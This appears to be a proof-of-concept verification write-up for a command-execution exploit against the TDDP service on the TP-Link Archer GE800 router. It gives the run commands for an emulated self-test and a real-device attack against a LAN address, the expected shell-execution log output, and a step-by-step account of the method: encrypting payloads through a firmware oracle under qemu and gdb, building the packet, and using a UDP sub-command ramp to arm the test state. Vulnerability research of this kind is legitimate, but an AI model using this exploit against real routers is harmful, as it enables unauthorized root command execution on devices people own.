# Vulnerability Verification (TP-Link Archer GE800)

Includes the complete EXP: `exploit_tddp_hooks.py`

## Verification Environment

All dependencies are on the VM (`ssh iot`):

| Dependency                          | Location                                |
| ----------------------------------- | --------------------------------------- |
| EXP                                 | `~/ge800run/poc/exploit_tddp_hooks.py`  |
| Firmware tddp binary + musl libs    | `~/ge800run/runtime/ge800/{tddp, lib/}` |
| qemu-aarch64-static / gdb-multiarch | System PATH                             |

## One-Command Verification (End-to-End Self-Proof)

```bash
ssh iot "cd ~/ge800run/poc && python3 exploit_tddp_hooks.py --selftest --subcmd 0x17"
```

**Expected output (EXIT=0)**:

```
[*] encrypting payload via firmware oracle ...
[*] payload encrypted by the firmware cipher (oracle)
[*] tddp log tail:
    sh: 1: getfirm: not found
    [tddp_execCmd():72] cmd: tddp_hook_erase_radio
    sh: 1: tddp_hook_erase_radio: not found
    [tddp_execCmd():72] cmd: tddp_hook_close_dfs
    sh: 1: tddp_hook_close_dfs: not found
    [tddp_execCmd():72] cmd: tddp_hook_close_txbf
    sh: 1: tddp_hook_close_txbf: not found

[+] Hook command execution confirmed: tddp logged the cmd: line and forked /bin/sh
```

Interpretation:

- `cmd: tddp_hook_*` — tddp's own pre-execution log (`tddp_execCmd()`: vsprintf → print → fork → execve `/bin/sh -c`);
- `sh: 1: tddp_hook_*: not found` — the forked `/bin/sh` actually executed the command (no hook binary exists in the analysis environment; on a real device these are root factory scripts that execute for real).
- Script exit code 0 = verification passed.

## Verify with Different Hooks

```bash
ssh iot "cd ~/ge800run/poc && python3 exploit_tddp_hooks.py --selftest --subcmd 0x19"   # close_dfs
ssh iot "cd ~/ge800run/poc && python3 exploit_tddp_hooks.py --selftest --subcmd 0x1a"   # close_txbf
```

## Real-Device Attack Usage (Within LAN, at your own risk, authorized testing only)

```bash
# Requires same firmware version tddp + qemu + gdb (for offline encryption), then:
python3 exploit_tddp_hooks.py --target 192.168.0.1 --subcmd 0x17
```

## EXP Workflow Description

1. `oracle_encrypt`: qemu-user starts the **original unmodified** tddp (with gdb stub attached), breakpoint at 0x414ec4 (decrypt call site), inferior-call the firmware's own encryption function `0x411928`, dump the ciphertext — bit-for-bit identical to the device algorithm (empty key, no need to reverse the round function);
2. `build_packet`: v2 header + `MD5(header(digest field zeroed)‖plaintext zero-padded)` (aligned to 8 bytes);
3. Send: a single UDP socket continuously sends a sub-command ramp (0x0a→0x17) — the tddp session is tracked by source endpoint, so a single socket is required; the ramp is used to arm the test-state bit;
4. Evidence: tddp log (PTY line-buffered) captures the `cmd:` line + the forked sh echo.
